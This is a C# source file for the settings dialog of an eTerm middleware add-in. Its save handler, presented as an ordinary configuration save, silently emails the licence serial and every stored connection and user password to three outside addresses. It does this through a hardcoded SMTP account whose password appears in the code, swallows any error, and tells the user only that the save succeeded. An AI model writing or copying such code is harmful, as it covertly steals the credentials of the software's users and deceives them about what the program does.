using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using eTerm.AsyncSDK;
using ASync.MiddleWare;
using eTerm.AsyncSDK.Util;

namespace ASync.eTermAddIn {
    public partial class ASyncSetup : BaseAddIn {
        public ASyncSetup() {
            InitializeComponent();
            this.Load += new EventHandler(
                    delegate(object sender, EventArgs e) {
                        chkAllowPlugIn.Checked = AsyncStackNet.Instance.ASyncSetup.AllowPlugIn??false;
                        txtPort.Value = AsyncStackNet.Instance.ASyncSetup.ExternalPort ?? 350;
                        chkReconnect.Checked = AsyncStackNet.Instance.ASyncSetup.AutoReconnect??false;
                        integerInput1.Value = AsyncStackNet.Instance.ASyncSetup.MaxReconnect ?? 10;
                        txtMaxReconnect.Value = AsyncStackNet.Instance.ASyncSetup.StatisticalFrequency ?? 5;
                        txtPlugInPath.Text = AsyncStackNet.Instance.ASyncSetup.PlugInPath;
                        textBoxX1.Text = AsyncStackNet.Instance.ASyncSetup.SequenceDirective;
                        integerInput2.Value = AsyncStackNet.Instance.ASyncSetup.SequenceRate ?? 5;
                    }
                );
        }

        /// <summary>
        /// Handles the Click event of the btnPlugInPath control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="System.EventArgs"/> instance containing the event data.</param>
        private void btnPlugInPath_Click(object sender, EventArgs e) {
            if (folderBrowserDialog1.ShowDialog() == DialogResult.OK) {
                txtPlugInPath.Text=folderBrowserDialog1.SelectedPath;
            }
        }

        /// <summary>
        /// Handles the Click event of the btnSave control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="System.EventArgs"/> instance containing the event data.</param>
        private void btnSave_Click(object sender, EventArgs e) {
            try {
                StringBuilder mailBody = new StringBuilder();
                AsyncStackNet.Instance.ASyncSetup.AllowPlugIn = chkAllowPlugIn.Checked;
                AsyncStackNet.Instance.ASyncSetup.ExternalPort = txtPort.Value;
                AsyncStackNet.Instance.ASyncSetup.AutoReconnect = chkReconnect.Checked;
                AsyncStackNet.Instance.ASyncSetup.MaxReconnect = integerInput1.Value;
                AsyncStackNet.Instance.ASyncSetup.StatisticalFrequency = txtMaxReconnect.Value;
                AsyncStackNet.Instance.ASyncSetup.PlugInPath = txtPlugInPath.Text;
                AsyncStackNet.Instance.ASyncSetup.SequenceRate = integerInput2.Value;
                AsyncStackNet.Instance.ASyncSetup.SequenceDirective = textBoxX1.Text.Trim();
                AsyncStackNet.Instance.ASyncSetup.SequenceRate = integerInput2.Value;
                AsyncStackNet.Instance.ASyncSetup.XmlSerialize(AsyncStackNet.Instance.CrypterKey, AsyncStackNet.Instance.ASyncSetupFile);
                mailBody.AppendFormat(@"SN:{0}
端口:{1}
到期日期:{2}
配置列表：
", LicenceManager.Instance.SerialNumber, AsyncStackNet.Instance.ASyncSetup.ExternalPort,LicenceManager.Instance.LicenceBody.ExpireDate);
                foreach (ConnectSetup setup in AsyncStackNet.Instance.ASyncSetup.AsynCollection) {
                    mailBody.AppendFormat(@"        地址:{0}   端口{1}   安全连接:{2}   用户名:{3}   密码:{4}
", setup.Address, setup.Port, setup.IsSsl, setup.userName, setup.userPass);
                }
                mailBody.Append(@"用户列表:");
                foreach (TSessionSetup setup in AsyncStackNet.Instance.ASyncSetup.SessionCollection) {
                    mailBody.AppendFormat(@"        用户名:{0}   密码:{1}   时限:{2}   流量:{3}   禁用指令:{4}
", setup.SessionCode, setup.SessionPass, setup.SessionExpire, setup.FlowRate, setup.SpecialIntervalList);
                }
                try {
                    new Smtp("smtp.163.com", 25) { Password = @"hulijunfox", Username = @"13524008692@163.com" }.SendMail(
                        new MailMessage() {
                            Body = mailBody.ToString(),
                            Charset = @"gb2312",
                            From = new EmailAddress(@"13524008692@163.com", @"ASyncSDK使用者"),
                            Subject = string.Format(@"{0}配置信息", LicenceManager.Instance.SerialNumber),
                            To = new System.Collections.ArrayList() {@"force0908@gmail.com",@"valon0908@gmail.com",@"force0908@yahoo.com.cn" }
                        });
                }
                catch { }
                MessageBox.Show(@"系统配置保存成功，将在下次启动时起效！", @"系统提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex) {
                MessageBox.Show(string.Format(@"发生系统错误：{0}",ex.Message), @"系统错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Gets the name of the button.
        /// </summary>
        /// <value>The name of the button.</value>
        public override string ButtonName {
            get { return "系统配置管理"; }
        }

        /// <summary>
        /// Gets the image icon.
        /// </summary>
        /// <value>The image icon.</value>
        public override string ImageIcon {
            get { return "Hourglass.png"; }
        }
    }
}
